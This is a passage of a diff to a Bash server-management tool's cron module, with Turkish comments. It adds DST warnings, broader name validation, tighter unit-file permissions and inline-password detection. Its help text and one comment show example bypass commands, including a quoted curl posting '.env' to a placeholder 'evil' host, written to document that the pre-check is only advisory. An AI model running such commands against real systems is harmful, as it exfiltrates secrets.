@@ -284,6 +284,14 @@ _cron_help() {
     echo "  için kullanın. Ham modda (3) YOK SAYILIR (uyarılır) — orada dilimi ifadenin"
     echo "  içine kendiniz yazarsınız."
     echo ""
+    echo "  YAZ SAATİ (DST): sunucunun dilimi yaz saati uyguluyorsa, YEREL saate bağlanmış"
+    echo "  SABİT saatli bir iş yılda iki kez sorun çıkarır — ilkbaharda (saat ileri) O GÜN"
+    echo "  HİÇ ÇALIŞMAYABİLİR, sonbaharda (saat geri) İKİ KEZ çalışabilir. 'cron add' bunu"
+    echo "  EKLEME ANINDA tespit edip uyarır ve '--utc' önerir. Türkiye (Europe/Istanbul,"
+    echo "  kalıcı +03) DST uygulamaz — orada bu uyarı hiç çıkmaz."
+    echo "  'cron list'/'cron show' ekranında UTC→yerel karşılıkları ŞU ANKİ ofsetle"
+    echo "  hesaplanır ve bu yüzden 'YAKLAŞIK' olarak etiketlenir."
+    echo ""
     echo "  NOT (davranış değişikliği): srvctl 2.0.0'a kadar 1 ve 2. biçimler HER ZAMAN"
     echo "  UTC'ye sabitleniyordu. Diskte duran ESKİ cron'lar DEĞİŞTİRİLMEDİ (unit"
     echo "  dosyalarındaki açık ' UTC' soneki korunur); 'cron list'/'cron show' onları"
@@ -293,15 +301,31 @@ _cron_help() {
     echo "  edilsin mi (systemd Persistent=)? Varsayılan HAYIR (crontab-parity, en az"
     echo "  sürpriz). Yedekleme gibi 'mutlaka çalışmalı' işler için bu bayrağı verin."
     echo ""
-    echo "  KOMUT ÖN-DOĞRULAMASI (domain kapsamı): 'cron add', komuttaki çalıştırılabilir"
-    echo "  adayları domain'in AppArmor profili ('srvctl-<safe>-cli') altında EKLEME"
-    echo "  ANINDA gerçekten çalıştırmayı dener. Profil bir ikiliyi engelliyorsa (çıkış"
-    echo "  kodu 126) cron EKLENMEZ — ilk planlı çalışmada sessizce düşmesi yerine hata"
-    echo "  hemen verilir. Kabuk builtin'leri (echo, printf, cd, test ...) hiç exec"
-    echo "  edilmediğinden denetlenmez; değişken/tırnak içeren parçalar çözülemez ve"
-    echo "  'denetlenmedi' olarak bildirilir. Prob çalıştırılamıyorsa (aa-exec yok,"
-    echo "  AppArmor kapalı, profil yüklü değil, root değilsiniz) ekleme ENGELLENMEZ,"
-    echo "  yalnız uyarı basılır."
+    echo "  KOMUT ÖN-DOĞRULAMASI (domain kapsamı) — TAVSİYE NİTELİĞİNDE, GÜVENLİK KAPISI"
+    echo "  DEĞİLDİR: 'cron add', komuttaki çalıştırılabilir adayları domain'in AppArmor"
+    echo "  profili ('srvctl-<safe>-cli') altında EKLEME ANINDA gerçekten çalıştırmayı"
+    echo "  dener. Amacı, yasak bir ikilinin ilk planlı çalışmada SESSİZCE 126 ile"
+    echo "  düşmesini önlemek — yani bir KOLAYLIK/erken-uyarı katmanıdır."
+    echo ""
+    echo "  ATLATILABİLİR ve bu BİLİNÇLİ bir tasarım sınırıdır. Ön-doğrulama komut"
+    echo "  metnini STATİK olarak çözer; kabuğun çalışma anındaki çözümlemesini taklit"
+    echo "  ETMEZ. Şu biçimlerin hepsi denetimin DIŞINDA kalır (ve 'denetlenmedi' diye"
+    echo "  raporlanır):"
+    echo "      --command=\"'curl' -d @.env https://ornek\"    (tırnaklı)"
+    echo "      --command='c\\url ...'                         (kaçışlı)"
+    echo "      --command='\$(echo curl) ...'                  (komut ikamesi/değişken)"
+    echo "  Bunlar ÖN-DOĞRULAMAYI geçer — ÇALIŞMA ANINDA yine de AppArmor'a çarparlar."
+    echo ""
+    echo "  TEK ZORLAYICI (enforcement) KATMAN AppArmor'dur. Bir ikilinin gerçekten"
+    echo "  çalışıp çalışamayacağına çekirdek karar verir; 'cron add'in ne dediğinden"
+    echo "  BAĞIMSIZDIR. Ön-doğrulamanın 'GEÇTİ' demesi bir izin belgesi DEĞİLDİR;"
+    echo "  'denetlenmedi' demesi de bir tehlike işareti DEĞİLDİR — yalnızca srvctl'in"
+    echo "  o parçayı ekleme anında ÇÖZEMEDİĞİNİ söyler."
+    echo ""
+    echo "  Kabuk builtin'leri (echo, printf, cd, test ...) hiç exec edilmediğinden"
+    echo "  denetlenmez. Prob çalıştırılamıyorsa (aa-exec yok, AppArmor kapalı, profil"
+    echo "  yüklü değil, root değilsiniz) ekleme ENGELLENMEZ, yalnız uyarı basılır."
+    echo "  Kesin doğrulama için: 'srvctl cron run <domain> <ad>'."
     echo ""
     echo "  Çıkış kodu teşhisi: 126 = izin reddedildi (çoğunlukla AppArmor profili bir"
     echo "  ikiliyi engelliyor), 127 = komut bulunamadı, 75 = deploy kilidi meşguldü"
@@ -623,6 +647,62 @@ _cron_tz_offset_minutes() {
     _cron_parse_offset_minutes "$z" || printf ''
 }
 
+# ─── YAZ SAATİ (DST) TESPİTİ — denetim O-3 ───
+#
+# NEDEN GEREKLİ: yeni varsayılan "sunucu yerel saati"dir. DST UYGULAYAN bir
+# dilimde bu, yılda iki kez GERÇEK bir işletim hatasına dönüşür:
+#   * İLKBAHAR (saat ileri): yerel saat 03:00'a atlarsa 02:00–03:00 arasına
+#     zamanlanmış iş O GÜN HİÇ ÇALIŞMAZ (systemd o yerel anı bulamaz).
+#   * SONBAHAR (saat geri): 02:00–03:00 aralığı İKİ KEZ yaşanır; Persistent=
+#     ve OnCalendar semantiğine göre iş İKİ KEZ çalışabilir. İki kez koşan
+#     bir yedekleme diski doldurabilir; iki kez koşan bir 'deploy prune'
+#     canlı release'i etkileyebilir.
+# Türkiye (Europe/Istanbul) 2016'dan beri KALICI +03'tür — DST YOKTUR ve bu
+# tespit orada HİÇBİR uyarı üretmez (yanlış alarm yok).
+#
+# YETENEK TESPİTİ (sürüm karşılaştırması DEĞİL — CLAUDE.md kuralı): epoch'tan
+# tarih üretmenin iki ayrı bayrağı vardır; GNU (Ubuntu 22.04/24.04) 'date -d
+# @<epoch>', BSD (macOS geliştirme kutusu) 'date -r <epoch>'. Hangisinin
+# olduğu ÖNCE denenerek anlaşılır, 'uname'/sürüm bakılmaz. Hiçbiri yoksa
+# fonksiyon "bilinmiyor" der — YANLIŞ bir cevap ASLA uydurulmaz.
+_cron_date_at_epoch_offset() {
+    local tz="${1:-}" epoch="${2:-}" out=""
+    [[ "$epoch" =~ ^[0-9]+$ ]] || return 1
+    if date -d "@0" +%z >/dev/null 2>&1; then
+        out=$(TZ="$tz" date -d "@${epoch}" +%z 2>/dev/null) || out=""
+    elif date -r 0 +%z >/dev/null 2>&1; then
+        out=$(TZ="$tz" date -r "$epoch" +%z 2>/dev/null) || out=""
+    fi
+    [[ -n "$out" ]] || return 1
+    printf '%s' "$out"
+}
+
+# Dilim yaz saati uyguluyor mu? PREDİKAT: 0=EVET, 1=HAYIR, 2=BİLİNMİYOR.
+# Ölçüm: aynı yılın OCAK ve TEMMUZ ortasındaki UTC ofsetleri FARKLI mı?
+# (Güney yarımküre dilimleri de yakalanır — fark hangi yönde olursa olsun
+# DST demektir.) Sabit epoch'lar KASITLI: "şu an"a bağlı bir ölçüm testte
+# ve üretimde farklı sonuç verirdi.
+#   1705320000 = 2024-01-15 12:00:00 UTC
+#   1721044800 = 2024-07-15 12:00:00 UTC
+_cron_tz_has_dst() {
+    local tz="${1:-}"
+    [[ -n "$tz" ]] || return 2
+    local jan jul
+    jan=$(_cron_date_at_epoch_offset "$tz" 1705320000) || return 2
+    jul=$(_cron_date_at_epoch_offset "$tz" 1721044800) || return 2
+    if [[ "$jan" != "$jul" ]]; then
+        return 0
+    fi
+    return 1
+}
+
+# Sunucunun kendi diliminde DST var mı? Aynı PREDİKAT sözleşmesi (0/1/2).
+_cron_server_tz_has_dst() {
+    local tz
+    tz=$(_cron_server_timezone)
+    _cron_tz_has_dst "$tz"
+}
+
 # "Europe/Istanbul, UTC+03:00" — tek satırlık, ekrana basılabilir dilim
 # etiketi. İkisinden biri bilinmiyorsa bilinen kısmı, hiçbiri bilinmiyorsa
 # 'bilinmiyor' basar.
@@ -752,8 +832,20 @@ _cron_schedule_tz_note() {
         return 0
     fi
     if [[ -n "$off" && -n "$hhmm" ]] && local_hhmm=$(_cron_shift_hhmm "$hhmm" "$off"); then
-        printf "UTC'de zamanlanmış (%s UTC) — sunucu yerel saatiyle (%s) %s'e denk geliyor" \
-            "$hhmm" "$tzdisp" "$local_hhmm"
+        # DÜRÜSTLÜK (denetim O-3): burada kullanılan ofset ANLIK ofsettir
+        # (_cron_tz_offset_minutes → 'TZ=<ad> date +%z', yani ŞU AN). Yaz
+        # saati uygulayan bir dilimde yılın diğer yarısında bu karşılık 1
+        # saat YANLIŞTIR. Karşılık artık "yaklaşık" diye etiketlenir ve
+        # dilimde DST VARSA bu açıkça söylenir. Türkiye (+03, DST yok)
+        # etkilenmez — o durumda ek not BASILMAZ (yanlış alarm yok).
+        local dst_rc=0
+        _cron_server_tz_has_dst || dst_rc=$?
+        local dst_note=""
+        if (( dst_rc == 0 )); then
+            dst_note=" ⚠ bu dilim YAZ SAATİ uyguluyor: yılın diğer yarısında karşılık 1 saat KAYAR"
+        fi
+        printf "UTC'de zamanlanmış (%s UTC) — sunucu yerel saatiyle (%s) YAKLAŞIK %s'e denk geliyor (şu anki ofsete göre)%s" \
+            "$hhmm" "$tzdisp" "$local_hhmm" "$dst_note"
         return 0
     fi
     printf "UTC'de zamanlanmış — sunucu yerel saati: (%s); bu ifadenin SABİT bir saati olmadığından yerel karşılığı hesaplanamadı" "$tzdisp"
@@ -811,12 +903,25 @@ _cron_resolve_schedule() {
 # Cron adı doğrulaması — YENİ bir regex YAZILMADI, mevcut assert_safe_ident
 # (core.sh) KULLANILIYOR (görev talebi). Ek olarak makul bir uzunluk sınırı
 # (unit dosya adı hijyeni — diğer kimliklerle AYNI konvansiyon).
+#
+# ⚠ ÇAĞRI YERLERİ (denetim O-4 düzeltmesi): bu kapı ESKİDEN YALNIZCA
+# '_cron_add'de vardı. '$name' ise SEKİZ ayrı yerde bir DOSYA YOLUNA
+# ('${sysd_dir}/${svc}', sidecar '.conf', unit adları) gömülüyor ve
+# '_cron_remove' bunlardan birini 'rm -rf --' ile SİLİYOR. Yol geçişi o
+# fonksiyonda TESADÜFEN engelleniyordu (önce '[[ -e ... ]]' varlık kapısı
+# çalışıyor, '../x' böyle bir unit'e denk gelmiyordu) — ama 'rm -rf' içeren
+# bir yolda tesadüfe güvenmek kabul edilemez. Artık add/remove/run/show/
+# enable/disable/logs — YEDİ giriş noktasının HEPSİ doğruluyor.
 _cron_ident_ok() {
     local name="$1"
     [[ -n "$name" ]] || return 1
     (( ${#name} <= 50 )) || return 1
     assert_safe_ident "$name"
 }
+
+# Tek doğruluk kaynağı: yedi çağrı yerinin HEPSİ aynı metni basar (drift yok).
+# shellcheck disable=SC2034
+_CRON_IDENT_ERR="Geçersiz cron adı: yalnız harf/rakam/alt çizgi ([a-zA-Z0-9_]), boş olamaz, azami 50 karakter. ('/', '..', boşluk ve nokta KABUL EDİLMEZ — bu ad bir systemd unit DOSYA ADINA gömülür.)"
 
 # sname="" → sistem kapsamı; sname="<safe_name>" → domain kapsamı.
 _cron_svc_name() {
@@ -1211,11 +1316,25 @@ _cron_resolve_bin() {
 # alabilir) için DEĞİLDİR. Bu yüzden ÇALIŞTIRARAK deneme YALNIZCA sistem
 # ikili dizinlerinin DOĞRUDAN çocuklarında yapılır; diğerleri
 # 'denetlenmedi' olarak AÇIKÇA raporlanır (sessizce 'geçti' SAYILMAZ).
-# SRVCTL_CRON_PROBE_DIRS: test-seam + operatör kaçış kapısı.
+#
+# ⚠ DİZİN LİSTESİ ARTIK SABİT (denetim, düşük öncelik — kaçış kapısı
+# KALDIRILDI). Eskiden 'SRVCTL_CRON_PROBE_DIRS' HEM test tohumu HEM
+# "operatör kaçış kapısı" olarak belgeleniyordu. Bu ikinci rol bir SORUNDU:
+# değişken, ROOT olarak çalışan 'srvctl cron add' sürecinde HANGİ dizindeki
+# ikililerin GERÇEKTEN exec edileceğini belirliyor — yani ortamı
+# etkileyebilen biri, probu kendi seçtiği bir dizindeki ikiliyi root olarak
+# çalıştırmaya yönlendirebilirdi. Prob'un amacı zaten "sistem ikilileri
+# zararsızca denenebilir" varsayımına dayanır; bu varsayımı operatörün
+# genişletebilmesi için hiçbir işlevsel gerekçe YOKTU (genişletmek 'cron
+# add'i güvenli kılmaz, yalnız daha çok şeyi çalıştırır).
+# Kalan TEK override 'SRVCTL_TEST_CRON_PROBE_DIRS' — adı ile SALT TEST
+# tohumu olduğunu ilan eder (depodaki SRVCTL_TEST_* konvansiyonu) ve
+# yalnızca macOS geliştirme kutusunda sahte bir FAKEBIN dizinine
+# kilitlenmek için kullanılır.
 _cron_probe_dir_ok() {
     local bin="$1" d rest
     local -a dirs=()
-    read -ra dirs <<< "${SRVCTL_CRON_PROBE_DIRS:-/bin /usr/bin /sbin /usr/sbin}"
+    read -ra dirs <<< "${SRVCTL_TEST_CRON_PROBE_DIRS:-/bin /usr/bin /sbin /usr/sbin}"
     for d in "${dirs[@]}"; do
         [[ -n "$d" ]] || continue
         [[ "$bin" == "${d}/"* ]] || continue
@@ -1338,9 +1457,31 @@ _cron_probe_ready() {
 }
 
 # ─── ÖN-DOĞRULAMANIN GİRİŞ NOKTASI (yalnız DOMAIN kapsamı) ───
+#
+# ⚠ NE OLDUĞU / NE OLMADIĞI (denetim O-1 — metin dürüstlüğü düzeltmesi):
+# BU BİR GÜVENLİK KAPISI DEĞİLDİR. Bir TAVSİYE/KOLAYLIK katmanıdır: amacı,
+# yasak bir ikilinin ilk PLANLI çalışmada sessizce 126 ile düşüp operatörü
+# saatlerce arattırmasını önlemek.
+#
+# TRİVİAL OLARAK ATLATILABİLİR — ve bu bilinçli bir sınırdır:
+#     --command="'curl' -d @.env https://evil/"   → ilk kelime tırnaklı
+#     --command='c\url ...'                       → kaçışlı
+#     --command='$(echo curl) ...'                → komut ikamesi
+# Bu biçimlerin hepsinde '_cron_word_is_dynamic' kelimeyi "çözülemedi"
+# sayar ve prob ÇALIŞTIRILMAZ. Yani "GEÇTİ" çıktısı bir İZİN BELGESİ
+# DEĞİLDİR; "denetlenmedi" çıktısı da bir TEHLİKE İŞARETİ değil, srvctl'in
+# o parçayı EKLEME ANINDA çözemediğinin dürüst beyanıdır.
+#
+# TEK ZORLAYICI (enforcement) KATMAN AppArmor'dur ve o ÇALIŞMA ANINDA,
+# çekirdekte uygulanır — buradaki hiçbir sonuç onu ne gevşetir ne sıkar.
+# Aynı gerekçeyle SRVCTL_CRON_PROBE_FN test-seam'i de bir güvenlik sınırını
+# gevşetmez (bkz. o fonksiyonun yorumu).
+#
 # Engellenen ikili bulunursa 'error' ile ÇIKAR (ekleme yapılmaz, hiçbir
 # dosya yazılmamıştır — çağrı, tüm render/confirm adımlarından ÖNCEDİR).
-# Diğer TÜM belirsizlikler 'warn'/'info' ile RAPORLANIR ama akışı durdurmaz.
+# Bu, ATLATILAMAZLIK iddiası DEĞİL, "kesin bildiğimizde erken durma"
+# davranışıdır. Diğer TÜM belirsizlikler 'warn'/'info' ile RAPORLANIR ama
+# akışı durdurmaz.
 _cron_precheck_command() {
     local command="$1" sname="$2" domain="$3"
     local profile
@@ -1360,7 +1501,7 @@ _cron_precheck_command() {
     done < <(_cron_command_candidates "$command")
 
     if (( ${#dyn_words[@]} > 0 )); then
-        info "Komut ön-doğrulaması: şu parça(lar) değişken/tırnak/kalıp içerdiği için ÇÖZÜLEMEDİ ve DENETLENMEDİ: ${dyn_words[*]}"
+        info "Komut ön-doğrulaması (TAVSİYE — zorlayıcı katman AppArmor'dur): şu parça(lar) değişken/tırnak/kalıp içerdiği için ÇÖZÜLEMEDİ ve DENETLENMEDİ: ${dyn_words[*]}. Bu bir sorun İŞARETİ DEĞİLDİR; yalnızca srvctl'in ekleme anında ne çalışacağını bilemediğini söyler — çalışma anında AppArmor yine de karar verecektir."
     fi
     (( ${#exec_words[@]} > 0 )) || return 0
 
@@ -1386,7 +1527,7 @@ _cron_precheck_command() {
     done
 
     if (( ${#unprobed[@]} > 0 )); then
-        info "Komut ön-doğrulaması: şu yol(lar) sistem ikili dizinlerinin DIŞINDA olduğu için ÇALIŞTIRILARAK denenmedi (kendi betiğinizi 'cron add' anında çalıştırma riski alınmaz): ${unprobed[*]}"
+        info "Komut ön-doğrulaması: şu yol(lar) sistem ikili dizinlerinin DIŞINDA olduğu için ÇALIŞTIRILARAK denenmedi (kendi betiğinizi 'cron add' anında çalıştırma riski alınmaz) — DENETLENMEDİ, zorlama yine AppArmor'dadır: ${unprobed[*]}"
     fi
     if (( ${#timedout[@]} > 0 )); then
         warn "Komut ön-doğrulaması: şu ikili(ler) prob süresinde ('timeout' 5sn) yanıt vermedi — ÖLÇÜLEMEDİ, engelli olup olmadıkları BİLİNMİYOR: ${timedout[*]}"
@@ -1414,8 +1555,78 @@ _cron_precheck_command() {
     fi
 
     if (( ${#checked[@]} > 0 )); then
-        info "Komut ön-doğrulaması GEÇTİ: ${#checked[@]} ikili '${profile}' profili altında GERÇEKTEN çalıştırılabildi (${checked[*]})."
+        info "Komut ön-doğrulaması GEÇTİ: ${#checked[@]} ikili '${profile}' profili altında GERÇEKTEN çalıştırılabildi (${checked[*]}). NOT: bu bir izin belgesi DEĞİLDİR — ön-doğrulama tavsiye niteliğindedir ve tırnak/kaçış/komut-ikamesi ile atlatılabilir; tek zorlayıcı katman çalışma anındaki AppArmor profilidir."
     fi
+    return 0
+}
+
+# ═══════════════════════════════════════════════
+#  KOMUTTA DÜZ METİN PAROLA TESPİTİ (denetim O-2'nin İKİNCİ yarısı)
+# ═══════════════════════════════════════════════
+# Unit dosyasını 640 yapmak parolanın DİSKTEKİ world-readable kopyasını
+# kapatır ama İKİNCİ sızıntıyı kapatmaz: komut her çalıştığında parola
+# argv'de görünür ve '/proc/<pid>/cmdline' sunucudaki HER yerel kullanıcı
+# tarafından okunabilir (hash'lenmiş bir sır değil, DÜZ METİN). Ubuntu'nun
+# varsayılan 'hidepid' ayarı YOKTUR — yani bu, teorik değil pratik bir
+# okunabilirliktir. Doğru çözüm '--defaults-extra-file=' (root:600) ile
+# kimlik bilgisini dosyadan okutmaktır.
+#
+# KARAR: ENGELLEME YOK, UYARI VAR. Gerekçe: srvctl operatörün komutunu
+# yeniden yazamaz (yan etkileri bilemez) ve meşru istisnalar vardır (ör.
+# parolasız yerel soket kimlik doğrulaması ama '-p' yine de yazılmış).
+# Yanlış alarm üreten bir ENGEL, operatörü tespit katmanının tamamına
+# güvensiz kılardı.
+#
+# SAF PREDİKAT (0 = düz metin parola BENZERİ desen var, 1 = yok). Yan etki
+# YOK, çıktı YOK — bu yüzden testte tam karar tablosu kurulabilir.
+_cron_command_has_inline_password() {
+    local cmd="${1:-}"
+    local low
+    low=$(printf '%s' "$cmd" | tr '[:upper:]' '[:lower:]')
+
+    # 1) Ortam değişkeni biçiminde gömülü sırlar — ARAÇTAN BAĞIMSIZ, yanlış
+    #    alarm riski pratikte sıfır. (srvctl'in KENDİ 'REDISCLI_AUTH'
+    #    deseni — bkz. lib/backup.sh / lib/webhook.sh — sırrı ortam
+    #    değişkeniyle geçirir; ama orada değişken argv'ye DEĞİL environ'a
+    #    girer. Burada yakalanan, komut METNİNE gömülmüş olan hâlidir.)
+    local re_env='(^|[[:space:]])(pgpassword|mysql_pwd|redis_password|rediscli_auth|mongo_password)='
+    if [[ "$low" =~ $re_env ]]; then return 0; fi
+
+    # 2) Uzun biçim '--password=<değer>' / '--pass=<değer>' — DEĞER BOŞ
+    #    OLMAMALI ('--password=' tek başına "sor" anlamına gelir, sır DEĞİL).
+    local re_long='--pass(word)?=[^[:space:]]+'
+    if [[ "$low" =~ $re_long ]]; then return 0; fi
+
+    # 3) mysql ailesinin kısa biçimi '-p<parola>'. YANLIŞ ALARM KORUMASI:
+    #    bu desen YALNIZCA komut metninde mysql/mariadb ailesinden bir araç
+    #    geçiyorsa aranır — aksi halde 'mkdir -parents', 'sort -parallel',
+    #    'tar -pcf' gibi tamamen masum bitişik-değerli bayraklar parola
+    #    sanılırdı. Çıplak '-p' (değersiz, "parolayı SOR") KASITLI olarak
+    #    eşleşmez.
+    local re_tool='(mysql|mariadb)'
+    local re_short='(^|[[:space:]])-p[^[:space:]]+'
+    if [[ "$low" =~ $re_tool ]] && [[ "$low" =~ $re_short ]]; then return 0; fi
+
+    return 1
+}
+
+# Tespit edilirse TEK bir yönlendirici uyarı basar. Akışı ASLA durdurmaz.
+_cron_warn_password_in_command() {
+    local cmd="${1:-}"
+    _cron_command_has_inline_password "$cmd" || return 0
+    warn "Komutta DÜZ METİN parola benzeri bir argüman görülüyor ('-p<parola>' / '--password=...' / 'PGPASSWORD=...').
+  İKİ ayrı sızıntı yolu vardır:
+    1) systemd unit dosyası — srvctl bunu 640 root:root yazar, yani DİSKTE korunur;
+    2) argv — komut her çalıştığında parola '/proc/<pid>/cmdline' üzerinden
+       sunucudaki HER yerel kullanıcıya (ele geçirilmiş BAŞKA bir domain'in
+       web_<sname> kullanıcısı dahil) DÜZ METİN olarak görünür. Bunu srvctl
+       KAPATAMAZ — komutun kendisi değişmelidir.
+  Önerilen düzeltme (MariaDB/MySQL):
+    printf '[client]\\npassword=GIZLI\\n' > /root/.my.cnf.yedek && chmod 600 /root/.my.cnf.yedek
+    ... mysqldump --defaults-extra-file=/root/.my.cnf.yedek -u KULLANICI VERITABANI ...
+  (PostgreSQL için '~/.pgpass' 600; Redis için srvctl'in kendi 'REDISCLI_AUTH'
+  ortam değişkeni deseni — bkz. lib/backup.sh.)
+  Cron EKLENMEYE DEVAM EDİYOR: bu bir engel değil, uyarıdır."
     return 0
 }
 
@@ -1669,8 +1880,14 @@ _cron_write_sidecar() {
         printf 'SCHEDULE_MODE=%s\n' "$mode"
         printf 'CREATED_AT=%s\n' "$(date '+%Y-%m-%d %H:%M:%S')"
     } > "$sidecar_file"
-    chmod 644 "$sidecar_file" 2>/dev/null || true
-    chown root:root "$sidecar_file" 2>/dev/null || true
+    # 644 → 640 root:root (denetim O-2 ile AYNI gerekçe/tutarlılık). Sidecar
+    # yalnız operatörün ham zamanlama metnini tutar (sır DEĞİL) ve üst dizin
+    # zaten 700'dür; yine de srvctl'in yazdığı DOSYALARIN tek bir izin
+    # sözleşmesi olması, ileride buraya bir alan eklenirken sessiz bir sızma
+    # riskini kökten kaldırır. 'secure_file' ayrıca yolun sembolik bağ
+    # OLMADIĞINI doğrular (çıplak chmod/chown dereference EDERDİ).
+    secure_file "$sidecar_file" 640 "root:root" \
+        || warn "Sidecar dosyası izinleri uygulanamadı: ${sidecar_file}"
 }
 
 # ═══════════════════════════════════════════════
@@ -1688,7 +1905,12 @@ _cron_write_failure_hook() {
 [Unit]
 OnFailure=${fail_name}
 EOF
-    chmod 644 "${dropin_dir}/override.conf" 2>/dev/null || true
+    # 644 → 640 root:root (denetim O-2): unit/drop-in dosyaları ana cron
+    # unit'iyle AYNI gizlilik sınıfındadır (ExecStart= satırı operatörün ham
+    # komutunu — dolayısıyla olası bir '-p<parola>' argümanını — İÇERİR).
+    # 'secure_file' ayrıca yolun sembolik bağ OLMADIĞINI doğrular.
+    secure_file "${dropin_dir}/override.conf" 640 "root:root" \
+        || warn "Drop-in dosyasının izinleri uygulanamadı: ${dropin_dir}/override.conf"
 
     local target_arg
     if [[ "$is_system" == "true" ]]; then
@@ -1699,6 +1921,24 @@ EOF
     # target_arg/name burada TIRNAKSIZ gömülür: domain (validate_domain) ve
     # name (assert_safe_ident) ZATEN boşluk/özel-karakter İÇEREMEZ — tek
     # argv kelimesi olarak güvenle gömülebilirler (ek tırnaklama gerekmez).
+    #
+    # SERTLEŞTİRME (denetim, düşük öncelik — SAVUNMA DERİNLİĞİ/TUTARLILIK):
+    # bu yan-birim ana cron unit'iyle AYNI ayrıcalıkta (root) çalışır ama
+    # ilk sürümde HİÇBİR sandbox yönergesi TAŞIMIYORDU. Denetim, bildirim
+    # gövdesine kullanıcı metni GİRMEDİĞİNİ doğruladı (round-trip zafiyeti
+    # YOK) — yani bu bir açık kapatma DEĞİL, ana unit'lerdeki savunma
+    # derinliğinin buraya da taşınmasıdır. Yönergeler bilinçli olarak DAR
+    # tutuldu: bu birim yalnız 'srvctl cron _on-failure' çağırır; o da
+    # systemd özelliklerini okur, srvctl loguna yazar ve (varsa) bir
+    # bildirim gönderir.
+    #   * ProtectSystem=strict + ReadWritePaths=-<srvctl logs> — srvctl'in
+    #     KENDİ log dizini DIŞINDA hiçbir yere yazamaz ('-' öneki: dizin
+    #     henüz yoksa unit başlatmayı REDDETMESİN).
+    #   * ProtectHome=yes / PrivateTmp=yes / NoNewPrivileges=true —
+    #     srvctl-cron.service.tpl ile BİREBİR aynı gerekçe.
+    # 'User=' AYARLANMAZ: _on-failure root'a ait log dosyasına yazar ve
+    # notify yapılandırmasını okur (root:600) — ayrıcalık düşürmek işlevi
+    # kırardı.
     cat > "${sysd_dir}/${fail_name}" <<EOF
 # srvctl tarafından otomatik üretildi (srvctl cron add) — elle düzenlemeyin.
 [Unit]
@@ -1707,8 +1947,16 @@ Description=srvctl cron basarisizlik bildirimi (${name})
 [Service]
 Type=oneshot
 ExecStart=${SRVCTL_ROOT}/bin/srvctl cron _on-failure ${target_arg} ${name}
+ProtectSystem=strict
+ReadWritePaths=-${SRVCTL_ROOT}/logs
+ProtectHome=yes
+PrivateTmp=yes
+NoNewPrivileges=true
+RestrictSUIDSGID=true
+SystemCallArchitectures=native
 EOF
-    chmod 644 "${sysd_dir}/${fail_name}" 2>/dev/null || true
+    secure_file "${sysd_dir}/${fail_name}" 640 "root:root" \
+        || warn "Bildirim birimi izinleri uygulanamadı: ${sysd_dir}/${fail_name}"
 }
 
 # 'OnFailure=' tarafından tetiklenir — YALNIZ INTERNAL kullanım. Exit kodu
@@ -1820,14 +2068,26 @@ _cron_add() {
     # amaçlı normalize edilir.
     validate_bool "$catchup" || catchup="false"
 
-    _cron_ident_ok "$name" || error "Geçersiz cron adı: '${name}' (yalnız harf/rakam/alt çizgi, azami 50 karakter)"
+    _cron_ident_ok "$name" || error "$_CRON_IDENT_ERR"
     [[ -n "$schedule" ]] || error "--schedule zorunlu"
     [[ "$schedule" != *$'\n'* && "$schedule" != *$'\r'* ]] || error "--schedule satırsonu/CR içeremez"
     [[ -n "$command" ]] || error "--command zorunlu"
     [[ "$command" != *$'\n'* && "$command" != *$'\r'* ]] || error "--command satırsonu/CR içeremez"
+    # SİMETRİ (denetim, düşük öncelik): --description de bir systemd unit
+    # DEĞERİNE ('Description=') gömülür. Satırsonu/CR şu an yalnız
+    # render_template tarafından DOLAYLI olarak reddediliyordu; o savunma
+    # doğru ama HATA MESAJI operatöre "hangi girdi yüzünden" olduğunu
+    # söylemiyordu. Kontrol burada AÇIK hâle getirildi — --schedule/--command
+    # ile BİREBİR aynı desen (render_template'teki kapı KALDIRILMADI; iki
+    # katman birlikte durur).
+    [[ "$description" != *$'\n'* && "$description" != *$'\r'* ]] || error "--description satırsonu/CR içeremez"
     validate_uint "$timeout" 86400 || error "Geçersiz --timeout: ${timeout} (1-86400 saniye)"
     (( timeout >= 1 )) || error "--timeout en az 1 saniye olmalı"
     [[ -n "$description" ]] || description="$name"
+
+    # Düz metin parola tespiti — HER İKİ kapsamda da (sistem cron'ları en
+    # tipik 'mysqldump' kullanıcısıdır). Yalnız uyarır, ENGELLEMEZ.
+    _cron_warn_password_in_command "$command"
 
     local sysd_dir="${SRVCTL_SYSTEMD_DIR:-/etc/systemd/system}"
     local svc_name timer_name fail_name
@@ -1881,11 +2141,40 @@ _cron_add() {
         utc_hhmm=$(_cron_calendar_fixed_hhmm "$calendar")
         off_min=$(_cron_tz_offset_minutes)
         if [[ -n "$utc_hhmm" && -n "$off_min" && "$off_min" != "0" ]] && local_hhmm=$(_cron_shift_hhmm "$utc_hhmm" "$off_min"); then
-            warn "DİKKAT: bu iş SUNUCU YEREL SAATİYLE (${tz_display}) ${local_hhmm} civarında çalışacak — yazdığınız ${utc_hhmm} DEĞİL. '--utc' bayrağını kaldırırsanız tam olarak ${utc_hhmm} yerel saatinde çalışır."
+            # "civarında" + "şu anki ofsete göre": bu dönüşüm ANLIK ofsetle
+            # yapılır (bkz. _cron_schedule_tz_note'taki aynı dürüstlük notu).
+            warn "DİKKAT: bu iş SUNUCU YEREL SAATİYLE (${tz_display}) YAKLAŞIK ${local_hhmm} civarında çalışacak (şu anki ofsete göre) — yazdığınız ${utc_hhmm} DEĞİL. '--utc' bayrağını kaldırırsanız tam olarak ${utc_hhmm} yerel saatinde çalışır."
         fi
     else
         info "Zamanlama SUNUCUNUN YEREL saatine göre kuruldu (${tz_display}) — yazdığınız saat, işin çalışacağı saattir: ${calendar}"
         info "Not: birden fazla bölgedeki sunucuları AYNI mutlak anda tetiklemek istiyorsanız '--utc' bayrağını kullanın (OnCalendar'a ' UTC' soneki yazılır)."
+    fi
+
+    # ─── YAZ SAATİ (DST) UYARISI — denetim O-3 ───
+    # Yalnız SUNUCU YEREL SAATİNDE yorumlanacak (OnCalendar'da AÇIK dilim
+    # soneki OLMAYAN) VE SABİT bir SS:DD taşıyan işler için basılır:
+    #   * 'her 15 dakikada' gibi ARALIK işleri DST'den anlamlı biçimde
+    #     etkilenmez (yalnız kayar) → uyarı BASILMAZ (gürültü yok),
+    #   * '--utc' ile ya da ham modda ifadenin İÇİNE dilim yazılmış işler
+    #     zaten mutlak zamandadır → uyarı BASILMAZ.
+    # DST'siz dilimlerde (Türkiye +03) HİÇBİR uyarı çıkmaz.
+    # NOT: değişken adları '_' ile BAŞLAMAZ — 'X || _var=$?' biçimi
+    # tests/test_no_undefined_functions.sh'ın statik tarayıcısında bir
+    # FONKSİYON ÇAĞRISI gibi görünür (alt çizgi öneki o dedektörün
